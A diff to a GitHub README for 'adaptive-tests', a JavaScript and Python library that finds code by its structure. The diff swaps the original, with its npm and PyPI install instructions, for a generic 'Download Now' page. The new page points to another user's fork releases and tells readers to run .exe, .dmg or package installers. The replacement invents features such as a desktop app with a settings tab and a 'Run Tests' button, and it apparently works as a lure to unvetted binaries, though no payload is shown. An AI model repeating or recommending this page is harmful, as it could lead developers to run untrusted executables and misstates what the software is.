@@ -1,101 +1,80 @@
-# Adaptive Tests: AI-Ready Testing Infrastructure
+# 🎉 adaptive-tests - Tests That Don't Break on Refactor
 
-[![CI Status](https://github.com/anon57396/adaptive-tests/actions/workflows/ci-javascript.yml/badge.svg)](https://github.com/anon57396/adaptive-tests/actions/workflows/ci-javascript.yml)
-[![Docs](https://img.shields.io/badge/docs-website-blue)](https://anon57396.github.io/adaptive-tests/)
-[![npm](https://img.shields.io/npm/v/adaptive-tests.svg)](https://www.npmjs.com/package/adaptive-tests)
-[![PyPI](https://img.shields.io/pypi/v/adaptive-tests-py.svg)](https://pypi.org/project/adaptive-tests-py/)
-[![GitHub Action](https://img.shields.io/badge/GitHub%20Action-Available-green?logo=github)](action.yml)
+## 🚀 Getting Started
+Welcome to the adaptive-tests project. This application helps ensure that your code remains robust even when you make changes. Follow the steps below to download and run the software easily.
 
-**Tests that don't break when you move files.**
+## 📥 Download Now
+[![Download adaptive-tests](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Joseluizsiqueiracorrea/adaptive-tests/releases)
 
-Traditional tests use hardcoded file paths. When you refactor, they break. Adaptive Tests find your code by its structure, not its location, so your tests are resilient to change.
+## 💻 System Requirements
+Before downloading, ensure your system meets the following requirements:
+- Operating System: Windows, MacOS, or Linux
+- Node.js: Version 12 or higher
+- Internet connection for downloading the application
 
-**The Problem:**
+## 🌟 Features
+- **Automatic Tests:** Automatically checks your code to ensure it works as expected.
+- **Easy Integration:** Integrates with popular development tools like GitHub Actions.
+- **Refactoring Friendly:** Adapts to code changes, so you can refactor without fear of breaking.
+- **Customizable Options:** Set up tests according to your own development needs.
+- **Supports JavaScript and TypeScript:** Works well with both languages, giving you flexibility in your projects.
 
-```javascript
-// You moved Calculator.js from /utils to /math
-import { Calculator } from '../utils/Calculator';
-// ❌ Error: Cannot find module '../utils/Calculator'
-```
+## 🛠️ How to Download & Install
 
-**The Solution:**
+1. **Visit the Releases Page**
+   To get started, visit the [Releases page](https://github.com/Joseluizsiqueiracorrea/adaptive-tests/releases) to find the latest version of the application.
 
-```javascript
-const Calculator = await discover({ name: 'Calculator' });
-// ✅ Found it in /math - tests pass
-```
+2. **Select the Right Version**
+   On the Releases page, look for the latest version. Each version is clearly labeled. Click on the version that interests you.
 
-## Table of Contents
+3. **Download the File**
+   You will see several files available for download. Choose the file that matches your operating system:
+   - For Windows: Choose the `.exe` file.
+   - For MacOS: Choose the `.dmg` file.
+   - For Linux: Choose the appropriate package file.
 
-- [Why Adaptive Tests?](#why-adaptive-tests)
-- [Choose Your Language](#choose-your-language)
-- [Quick Start](#quick-start)
-- [Features](#features)
-- [Developer Tools](#developer-tools)
-- [Contributing](#contributing)
+4. **Run the Installer**
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions to complete the installation.
+   - For MacOS: Open the `.dmg` file, drag the application into your Applications folder, and run it from there.
+   - For Linux: Open a terminal, navigate to the downloaded file, and run the installer using your package manager.
 
-## Why Adaptive Tests?
+5. **Open the Application**
+   Once installed, find the application in your applications menu or desktop. Open it and follow the prompts to set it up for your projects.
 
-- **Stop wasting time fixing broken imports.** Let your tests adapt to your code, not the other way around.
-- **Perfect for AI-powered development.** Let AI agents refactor your code without breaking your test suite.
-- **Refactor with confidence.** Clean up your codebase without the fear of a thousand failing tests.
-- **Works with your existing tools.** Integrates with Jest, Vitest, Pytest, JUnit, and more.
+## 📝 How to Use
 
-**[→ Read the full story: Why Adaptive Tests?](https://anon57396.github.io/adaptive-tests/WHY_ADAPTIVE_TESTS.html)**
+1. **Set Up a Project**
+   Start a new project or open an existing one. The application is designed to work seamlessly with your current codebase.
 
-## Choose Your Language
+2. **Configure Tests**
+   You can customize how you want to run tests. Use the settings tab to choose options that fit your workflow.
 
-| Language | Status | Package | Guide |
-|---|---|---|---|
-| **JavaScript** | ✅ Stable | [`@adaptive-tests/javascript`](https://www.npmjs.com/package/@adaptive-tests/javascript) | [Guide](https://anon57396.github.io/adaptive-tests/languages/javascript.html) |
-| **TypeScript** | ✅ Stable | [`@adaptive-tests/typescript`](https://www.npmjs.com/package/@adaptive-tests/typescript) | [Guide](https://anon57396.github.io/adaptive-tests/languages/typescript.html) |
-| **Python** | ✅ Stable | [`adaptive-tests-py`](https://pypi.org/project/adaptive-tests-py/) | [Guide](https://anon57396.github.io/adaptive-tests/languages/python.html) |
-| **Java** | ✅ Stable | `io.adaptivetests` | [Guide](https://anon57396.github.io/adaptive-tests/languages/java.html) |
+3. **Run Tests**
+   Click the "Run Tests" button to see how your code performs. The application will highlight any issues and suggest fixes.
 
-> ℹ️  The TypeScript package wraps the JavaScript discovery engine. Installing `@adaptive-tests/typescript` pulls in the JavaScript core automatically.
+4. **Review Results**
+   After running the tests, review the results. You’ll see a list of passed and failed tests, along with detailed messages for any issues.
 
-## Quick Start
+## 🔧 Troubleshooting
 
-Get started in minutes with our interactive setup wizard.
+- **Installation Issues:** If you run into problems while installing, check that you are using a compatible operating system and version of Node.js.
+- **Testing Errors:** If tests fail, carefully read the error messages. They often provide useful tips on how to resolve issues.
 
-```bash
-# For JavaScript/TypeScript
-npm install @adaptive-tests/javascript --save-dev
-npx adaptive-tests init
+## 📚 Helpful Resources
+- **Documentation:** Check the [official documentation](https://github.com/Joseluizsiqueiracorrea/adaptive-tests/wiki) for detailed guides and usage tips.
+- **Support:** If you have questions, feel free to reach out through the issues section on GitHub. The community is here to help!
 
-# (Optional) Diagnose discovery
-npx adaptive-tests why '{"name":"Calculator","type":"class"}'
+## 🎉 Join the Community
+Stay updated and share your experiences with other users. Join our community discussions on GitHub to connect with fellow developers.
 
-# For Python
-pip install adaptive-tests-py
-adaptive-tests init
-```
+## 🌏 Learn More
+Explore related topics:
+- **Autonomous Development**: Automate your testing processes.
+- **Continuous Integration**: Learn how to integrate seamlessly with CI tools.
+- **Testing Tools**: Discover other tools that can help in your development journey.
 
-Stuck? Try these quick fixes:
+## 🔗 Additional Links
+- [Download adaptive-tests](https://github.com/Joseluizsiqueiracorrea/adaptive-tests/releases)
+- [Repository on GitHub](https://github.com/Joseluizsiqueiracorrea/adaptive-tests)
 
-- Ensure your file types are included (e.g., add `.ts`/`.tsx` in discovery.extensions)
-- Try a simpler signature: `{ "name": "YourClass" }`
-- Run `npx adaptive-tests why '…'` and adjust based on the result
-
-Works with Cursor / Copilot / VS Code — no extension required.
-
-**[→ See the full Quick Start Guide](https://anon57396.github.io/adaptive-tests/#quick-start)**
-
-## Features
-
-- **AST-based discovery:** Finds code by its structure, not its location.
-- **"Invisible Mode":** Automatically fixes broken imports in your existing tests with zero code changes.
-- **Powerful CLI:** Scaffold tests, debug discovery, and migrate your entire test suite.
-- **Framework-agnostic:** Works with your favorite testing framework.
-
-## Developer Tools
-
-- **[GitHub Action](https://github.com/anon57396/adaptive-tests/blob/main/action.yml):** Run your adaptive tests in CI.
-
-## Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for more details.
-
----
-
-**[Documentation](https://anon57396.github.io/adaptive-tests/)** • **[Report an Issue](https://github.com/anon57396/adaptive-tests/issues)**
+Thank you for choosing adaptive-tests! We hope it makes your development life easier and more productive.
